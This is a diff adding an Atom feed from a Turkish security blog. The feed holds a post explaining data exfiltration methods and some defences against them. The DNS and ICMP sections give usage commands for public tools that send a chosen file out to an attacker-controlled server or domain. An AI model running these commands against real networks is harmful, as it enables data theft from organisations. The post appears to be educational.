@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Enes Ergün - siber güvenlik</title><link href="https://enesergun.net/" rel="alternate"></link><link href="https://enesergun.net/feeds/siber-guvenlik.atom.xml" rel="self"></link><id>https://enesergun.net/</id><updated>2018-11-11T13:48:00+03:00</updated><subtitle>Personel homepage about of my Profession</subtitle><entry><title>Data Exfiltration</title><link href="https://enesergun.net/data-exfiltration.html" rel="alternate"></link><published>2018-11-11T13:48:00+03:00</published><updated>2018-11-11T13:48:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-11-11:/data-exfiltration.html</id><summary type="html">&lt;h2&gt;Data Exfiltration Nedir?&lt;/h2&gt;
+&lt;p&gt;Bir kişi veya grubun yetkisiz bir biçimde bir veriyi başka bir bilgisayar yada sunucuya kopyalaması, transfer etmesi anlamına gelir. Data extrusion(veri çıkarma), data exportation(veri ihracati!), data theft(veri hırsızlığı) olarak da bilinir.&lt;/p&gt;
+&lt;p&gt;Örnek vermek gerekirse bir banka çalışanının bankaya ait verileri bir USB(!) içerisinde dışarıya …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Data Exfiltration Nedir?&lt;/h2&gt;
+&lt;p&gt;Bir kişi veya grubun yetkisiz bir biçimde bir veriyi başka bir bilgisayar yada sunucuya kopyalaması, transfer etmesi anlamına gelir. Data extrusion(veri çıkarma), data exportation(veri ihracati!), data theft(veri hırsızlığı) olarak da bilinir.&lt;/p&gt;
+&lt;p&gt;Örnek vermek gerekirse bir banka çalışanının bankaya ait verileri bir USB(!) içerisinde dışarıya çıkartması bir suçtur. Fakat işler her zaman bu şekilde USB gibi şeyler ile de olmamaktadır. Bazen veri kaçırmayı tanımlamak çok zor hale gelebilmektedir. Farklı yöntemleri vardır.&lt;/p&gt;
+&lt;p&gt;Bu yazıda sizlere yöntemlerinden kısaca bahsedeceğim.&lt;/p&gt;
+&lt;h2&gt;Basit Yöntemler&lt;/h2&gt;
+&lt;h3&gt;E-Posta&lt;/h3&gt;
+&lt;p&gt;Aklımıza gelebilecek en kolay çözüm bir veriyi kaçırmak istersek bunu eposta ile gönderebilir ve karşı tarafta indirerek işlem tamamlanmış olabilir. Fakat burada engelleme adına Email gatewayler karşımıza çıkmaktadır. Email gatewayler temel olarak mail içerisinde zararlı var mı diye kontrol eder fakat içerisinde data kaçırmaya karşı modüllerde bulunmaktadır. Tabi burada Titus gibi yazılımlar ile birlikte datanın sınıflandırması, arkaplanda bunların loglarının tutulması da bir engel olarak görülebilir.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Parola korumalı bir sıkıştırılmış dosyayı nasıl farkedeceklerini bilmiyorum. Ama farkedemeyeceklerini düşünüyorum.&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Cihazlara Yüklemek&lt;/h3&gt;
+&lt;p&gt;Günümüzde yanımızda bir çok akıllı cihaz taşıyoruz. Bu kısımda kurum içerisinde ki bir datayı kaçırmak isteyen kişinin telefonuna, taşınabilir diskine, laptop kullanılıyorsa bluetooth ile telefonuna atması işten bile değildir. Hatta günümüzde web.whatsapp gibi bir arayüz ile whatsapp üzerinden bile kaçırılabilir.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Bu kısım sıkı bir takip istemekte birlikte nasıl engellenebileceği konusunda bir yorumum dahi bulunmamaktadır.&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;Teknik Yöntemler&lt;/h2&gt;
+&lt;p&gt;Bu kısımda data exfiltration kısmında karşımıza bir çok yöntem çıkmakta tabi ki teknik zorlukları da bulunmaktadır. &lt;/p&gt;
+&lt;h3&gt;FTP&amp;amp;SFTP&lt;/h3&gt;
+&lt;p&gt;Aslında çokta teknik olmayan bir konudur. Uzaktaki bir sunucuya FTP&amp;amp;SFTP servis kurulur ve veriler bu servisler aracılığı ile dışarıya çıkartılabilir.&lt;/p&gt;
+&lt;p&gt;Önlemek için giden trafiği inceleyecek güvenlik cihazları/yazılımları yeterli olacaktır. Trafik içerisinde gönderilen trafik boyutuda önemli bir faktördür tabi ki. Zaten çoğu güvenlik ürünü anomaly'i farkedecektir.&lt;/p&gt;
+&lt;h3&gt;HTTP Methodları ile Göndermek&lt;/h3&gt;
+&lt;p&gt;Bu kısımda çok teknik bir konu değildir aslında. Basit bir Web Servis yazıp bu web servise bir form koyup buradan gelecek tüm verinin arkaplanda ayrı ayrı yazıldığını düşünürseniz gayet kolaydır. Hatta çıkartılacak veriyi binary code çevirip basarsanız ve arkaplanda tekrar eski haline çevirirseniz ihtiyaçlarınızı karşılayacaktır.&lt;/p&gt;
+&lt;h2&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Asıl Bahsetmek İstediğim Kısıma Gelelim&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Bu kısımdan önceki yazılar tamamen genel anlamda nasıl olduğundan bahsetmek amacıylaydı.&lt;/p&gt;
+&lt;p&gt;Bu kısımda daha önce karşıma çıkmış olan 2 adet yöntemden bahsedeceğim, zaten yazının ana konusu bu 2 yöntemdir.&lt;/p&gt;
+&lt;h3&gt;ICMP Data Exfiltration&lt;/h3&gt;
+&lt;p&gt;ICMP protokolü kullanılarak yapılan yöntemdir. Yani genel anlamda bizim bildiğimiz ping komutu ile birlikte yapılan işlemlerdir. ICMP protokolü içerisinde çok fazla data veya bilgi barındırmaz basit yapıda bir protokoldür bu sebeple data exfiltration işlemleri yavaş ilerleyecektir. Kişiler ICMP Echo Requestler içerisinde göndermek istedikleri datanın binary halini atarak dışarıya veri sızdırabilmektedirler.&lt;/p&gt;
+&lt;p&gt;ICMP Paketlerinin boyutu 74 bytedır. Data exfiltration kısmında genellikle 100 byte ile 542 byte arasını geçmemektedir.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Engellemek adına yeni nesil tüm cihazlar bozuk ICMP paketlerini tespit edebilecek seviyededirler.&lt;/code&gt;&lt;/p&gt;
+&lt;h4&gt;Nasıl Yapılır?&lt;/h4&gt;
+&lt;p&gt;&lt;a href="https://github.com/martinoj2009/ICMPExfil"&gt;ICMPExfil&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Yukarıda vermiş olduğum linkteki araç ile ping.py ve server.py dosyaları kullanılarak bu işlem gerçekleştirilebilir.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ping.py --ip PINGATACAGINIZSERVER --asciiFile göndereceğinizdosya&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;DNS Data Exfiltration&lt;/h3&gt;
+&lt;p&gt;DNS üzerinden data exfiltration yapmaya yarar. DNS'in çalışma mantığını kullanır. 
+Nedir DNS'in çalışma mantığı?&lt;/p&gt;
+&lt;p&gt;Gitmek istediğimiz bir domain'e ait olan IP'yi dünya üzerindeki veya bizim kendi networkümüzde bulunan bir DNS sunucuya sorar. DNS sunucuda kendisinde var ise bu domaine ait olan IP'yi geri döndürür ve site girmiş olursunuz, eğer yoksa sormuş olduğunuz dns servisi bir üst makama gidip root dns sunucularına sorar ve size de bu şekilde elçilik yapmış olur.&lt;/p&gt;
+&lt;p&gt;Bu kısımda data exfiltration için DNS sorgusu içerisinde ki CNAME ve TXT kayıtları kullanılmaktadır. Bu sayede paket içerisine yapısal olmayan bir çok veri koyulabilmektedir. &lt;/p&gt;
+&lt;h4&gt;Nasıl Yapılır&lt;/h4&gt;
+&lt;p&gt;&lt;a href="https://github.com/Arno0x/DNSExfiltrator"&gt;DNS Exfiltrator&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Bu kısımda kendinize ait bir sunucunuz olması gerekmektedir. Yukarıda vermiş olduğum link içerisinden dnsefiltrator.py dosyasını belirli argümanlarla çalıştırmanız gerekmektedir. Yazılım defaultta RC4 şifreleme yapmaktadır bu sebeple argüman olarak vermiş olduğunuz parola oldukça önemlidir.&lt;/p&gt;
+&lt;p&gt;Server üzerinde 
+&lt;code&gt;dnsexfiltrator.py -d domain -p PAROLA&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Client üzerinde&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;c:\DNSExfiltrator&amp;gt; powershell
+PS c:\DNSExfiltrator&amp;gt; Import-Module .\Invoke-DNSExfiltrator.ps1
+PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;-i argümanı ile göndermek istediğiniz dosya &lt;/li&gt;
+&lt;li&gt;-d argümanı ile server kısmında belirlemiş olduğunuz domainismi &lt;/li&gt;
+&lt;li&gt;-p kısmı ile server kısmında belirtmiş olduğunuz encrytion için kullanılacak parola &lt;/li&gt;
+&lt;li&gt;-s kısmında ise sunucunuzun IP adresi &lt;/li&gt;
+&lt;li&gt;-t kısmında ise throttleTime yani DNS sorguları arasında geçecek süreyi girmeniz gerekmektedir.(MS)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Dilerseniz -h parametresini kullanarak Google, CF gibi HTTP üzerinden DNS servislerinide kullanabilirsiniz.&lt;/p&gt;
+&lt;p&gt;Yazıyı burada sonlandırıyorum. Daha detaylı bilgilere ulaşmak veya daha fazla teknik okumak/görmek isterseniz aşağıdaki linki kullanabilirsiniz.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/"&gt;Data Exfiltration Techniques&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Burada anlatılanlar hakkında yaptığınız,yapacağınız tüm işlemlerden sizler sorumlusunuz. Mesuliyet kabul edilmemektedir.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Bu yazı tamamen bilgilendirme amaçlıdır.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Her yazının sonunda olduğu gibi klasik bu yazının şarkısını paylaşıyorum. &lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=DuDhiHSksaA"&gt;&lt;img alt="Beth Hart - Caught Out In The Rain" src="https://img.youtube.com/vi/DuDhiHSksaA/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="data exfil"></category><category term="veri kaçırma"></category><category term="veri kaçırma yöntemleri"></category><category term="data exfiltration türkçe"></category><category term="veri güvenliği"></category></entry></feed>
